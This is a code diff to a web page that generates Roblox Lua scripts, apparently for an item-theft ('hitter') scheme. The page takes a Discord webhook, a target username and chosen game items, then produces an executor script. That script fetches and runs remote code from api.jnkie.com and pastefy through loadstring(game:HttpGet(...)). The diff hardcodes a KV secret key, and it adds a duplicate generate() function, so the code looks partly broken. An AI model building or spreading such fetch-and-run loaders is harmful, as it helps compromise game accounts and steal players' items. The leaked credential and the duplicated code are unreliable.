@@ -800,6 +800,92 @@ function setAdminMode(mode) {
 function updateCustomAdmin() {
   customAdminLoadstring = document.getElementById('customAdminLoadstring').value;
 }
+ async function generate() {
+  const btn = document.querySelector('.btn-gen');
+  const out = document.getElementById('outputBlock');
+
+  if (btn.disabled) return;
+  btn.disabled = true;
+  btn.textContent = '⏳ Génération en cours...';
+  btn.style.opacity = '0.6';
+
+  try {
+    const username = document.getElementById('usernameInput').value.trim();
+    const webhook = document.getElementById('webhookInput').value.trim();
+
+    if (selected.size === 0) throw new Error('-- Veuillez sélectionner au moins un animal brainrot.');
+    if (!validateUsername()) throw new Error('-- Le nom d\'utilisateur doit faire au moins 3 caractères.');
+    if (!validateWebhook()) throw new Error('-- Le webhook doit commencer par https://discord.com/api/webhooks/');
+
+    const alias = generateAlias();
+
+    // Étape 1 : Stocker le webhook dans ton KV Worker
+    const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Secret-Key': 'VINHUB_KV_SECRET_9X4K7P2M_Q8L3Z5W1'
+      },
+      body: JSON.stringify({ alias, url: webhook })
+    });
+
+    if (!kvResponse.ok) throw new Error('Échec du stockage du webhook.');
+
+    // Étape 2 : Générer le script Lua
+    const names = [...selected];
+    const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
+
+    let adminScriptPart = '';
+    if (adminMode === 'admin-panel') {
+      adminScriptPart = `
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()
+end)
+`;
+    } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
+      adminScriptPart = customAdminLoadstring;
+    }
+
+    const script = `getgenv().WEBHOOK_URL = "${alias}"
+getgenv().TARGET_USERNAME = "${username}"
+getgenv().TARGET_BRAINROT = {
+${brainrotLines}
+}
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab71c35bd4b18d7c1ac52f950759f423c35b348cca80a7ae9724c0abe49/download"))()
+${adminScriptPart}
+`;
+
+    // Étape 3 : Upload du script sur Pastefy
+    const pastefyRawUrl = await uploadToPastefy(script);
+
+    if (pastefyRawUrl) {
+      // Afficher le lien raw dans la sortie
+      out.className = 'code-block';
+      out.textContent = `-- Script uploadé sur Pastefy avec succès !
+-- Copie ce loadstring dans ton exploiter :
+
+loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
+    } else {
+      // Si l'upload échoue, afficher le script brut
+      out.className = 'code-block';
+      out.textContent = `-- Échec de l'upload sur Pastefy.
+-- Voici le script brut (copie-le manuellement) :
+
+${script}`;
+    }
+
+  } catch (err) {
+    console.error(err);
+    out.className = 'code-block empty';
+    out.textContent = err.message || '-- Une erreur est survenue lors de la génération.';
+  } finally {
+    setTimeout(() => {
+      btn.disabled = false;
+      btn.textContent = '⚡ Générer le Script';
+      btn.style.opacity = '1';
+    }, 1500);
+  }
+}
 // ====================== RECHERCHE ROBLOX ======================
 async function searchRobloxUsers(query) {
   if (query.length < 3) return [];
@@ -959,7 +1045,6 @@ function validateWebhook() {
   }
 }
 
-// ====================== GENERATE (corrigé) ======================
 async function generate() {
   const btn = document.querySelector('.btn-gen');
   const out = document.getElementById('outputBlock');
@@ -973,13 +1058,14 @@ async function generate() {
     const username = document.getElementById('usernameInput').value.trim();
     const webhook = document.getElementById('webhookInput').value.trim();
 
-    if (selected.size === 0) throw new Error('-- Please select at least one brainrot animal.');
-    if (!validateUsername()) throw new Error('-- Username must be at least 3 characters long.');
-    if (!validateWebhook()) throw new Error('-- Webhook must start with https://discord.com/api/webhooks/');
+    if (selected.size === 0) throw new Error('Please select at least one brainrot animal.');
+    if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
+    if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
 
     const alias = generateAlias();
 
-    const response = await fetch(`${KV_WORKER_URL}/store`, {
+    // Store webhook
+    const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -988,8 +1074,9 @@ async function generate() {
       body: JSON.stringify({ alias, url: webhook })
     });
 
-    if (!response.ok) throw new Error('KV store failed');
+    if (!kvResponse.ok) throw new Error('Failed to store webhook.');
 
+    // Generate script
     const names = [...selected];
     const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
 
@@ -1001,10 +1088,7 @@ task.spawn(function()
 end)
 `;
     } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
-      adminScriptPart = `
-task.spawn(function()
-   `customAdminLoadstring`
-end)`
+      adminScriptPart = customAdminLoadstring;
     }
 
     const script = `getgenv().WEBHOOK_URL = "${alias}"
@@ -1016,13 +1100,27 @@ loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab7
 ${adminScriptPart}
 `;
 
-    out.className = 'code-block';
-    out.textContent = script;
+    // Upload to Pastefy
+    const pastefyRawUrl = await uploadToPastefy(script);
+
+    if (pastefyRawUrl) {
+      out.className = 'code-block';
+      out.textContent = `-- Script generated successfully!
+Copy this loadstring into your executor:
+
+loadstring(game:HttpGet("${pastefyRawUrl}"))()`;
+    } else {
+      out.className = 'code-block';
+      out.textContent = `-- Failed to upload to Pastefy.
+Here is the raw script (copy it manually):
+
+${script}`;
+    }
 
   } catch (err) {
     console.error(err);
     out.className = 'code-block empty';
-    out.textContent = err.message || '-- Une erreur est survenue lors de la génération.';
+    out.textContent = err.message || 'An error occurred.';
   } finally {
     setTimeout(() => {
       btn.disabled = false;
